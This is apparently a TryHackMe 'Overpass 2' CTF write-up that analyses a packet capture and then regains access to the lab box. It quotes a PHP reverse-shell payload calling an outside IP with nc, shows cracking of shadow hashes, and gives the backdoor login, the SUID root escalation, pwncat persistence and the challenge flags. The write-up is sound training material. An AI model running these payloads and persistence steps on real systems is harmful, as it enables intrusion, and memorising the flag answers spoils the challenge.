THM - Overpass 2

# Task 1: Forensics - Analyse the PCAP
1. What was the URL of the page they used to upload a reverse shell? `/development/`. Found on tcp stream 0: `tcp.stream eq 0`.
2. What payload did the attacker use to gain access? `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`. Found on tcp stream 1: `tcp.stream eq 1`.
3. What password did the attacker use to privesc? `whenevernoteartinstant`. Found on tcp stream 3: `tcp.stream eq 3`.
4. How did the attacker establish persistence? `git clone https://github.com/NinjaJc01/ssh-backdoor`. Found on tcp stream 3: `tcp.stream eq 3`.
5. Using the fasttrack wordlist, how many of the system passwords were crackable?
	1. Additional users as shown in `/etc/passwd` on `tcp.stream eq 3`: 
	```
	james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
	paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
	szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
	bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
	muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
	```
	
	2. Paste hashes in `passwords` file. 
	3. Download fasttrack wordlist with `https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/fasttrack/wordlist.txt` and run `sudo john --wordlist=/usr/share/wordlists/fasttrack.txt passwords`
	4. Output:
	```
	Using default input encoding: UTF-8
	Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
	Cost 1 (iteration count) is 5000 for all loaded hashes
	Will run 4 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	secret12         (bee)
	abcd123          (szymex)
	1qaz2wsx         (muirland)
	secuirty3        (paradox)
	4g 0:00:00:00 DONE (2020-12-01 20:28) 8.333g/s 462.5p/s 2312c/s 2312C/s Spring2017..starwars
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed
	```
	5. Four (`4`) passwords are crackable using the fasttrack wordlist.

# Task 2: Research - Analyse the code

6. What's the default hash for the backdoor? `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` found at <https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go>.
7. What's the hardcoded salt for the backdoor? `1c362db832f3f864c8c2fe05f2002a05` found at <https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go>.
8. What was the hash that the attacker used? - go back to the PCAP for this! `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`. Found on tcp stream 3: `tcp.stream eq 3`.
9. Crack the hash using rockyou and a cracking tool of your choice. What's the password?
	1. Identify the hash: `hash-identifier 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
	2. Output:
		```
		--------------------------------------------------
		
		Possible Hashs:
		[+] SHA-512
		[+] Whirlpool
		
		Least Possible Hashs:
		[+] SHA-512(HMAC)
		[+] Whirlpool(HMAC)
		--------------------------------------------------
		```
	3. Write hash and hardcoded salt (`1c362db832f3f864c8c2fe05f2002a05`) to `hash` file in format `hash:salt`.
	4. Hashcat craking command: `hashcat -m 1710 -a 0 -o cracked hash /usr/share/wordlists/rockyou.txt`. `man hashcat` finds `1720 = sha512($salt.$pass)` as the mode.
	5. `cat cracked`: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16`
	6. Password: `november16`

# Task 3: Attack - Get back in!

10. `nmap -T4 -Pn -sC 10.10.246.133`

	```
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-01 21:48 EST
	Nmap scan report for 10.10.246.133
	Host is up (0.11s latency).
	Not shown: 997 closed ports
	PORT     STATE SERVICE
	22/tcp   open  ssh
	| ssh-hostkey: 
	|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
	|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
	|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
	80/tcp   open  http
	|_http-title: LOL Hacked
	2222/tcp open  EtherNetIP-1
	
	Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds
	```

11. The attacker defaced the website. What message did they leave as a heading? `H4ck3d by CooctusClan`. Found on `http://10.10.246.133`.
12. Connect with `ssh james@10.10.246.133 -p 2222` and password `november16`. The attacker used the backdoor script and added that password in the `authorized_keys` file for james. This password is from the cracked hash.
13. `cat /home/james/user.txt`: `thm{d119b4fa8c497ddb0525f7ad200e6567}`
14. `james` home directory has `/home/james/suid_bash` file owned by root. Run it with `./.suid_bash -p` to get root.
15. `cat /root/root.txt`: `thm{d53b2684f169360bb9606c333873144d}`
16. `run persist.passwd` in [pwncat](https://github.com/calebstewart/pwncat) local shell for persistance through `/etc/passwd`.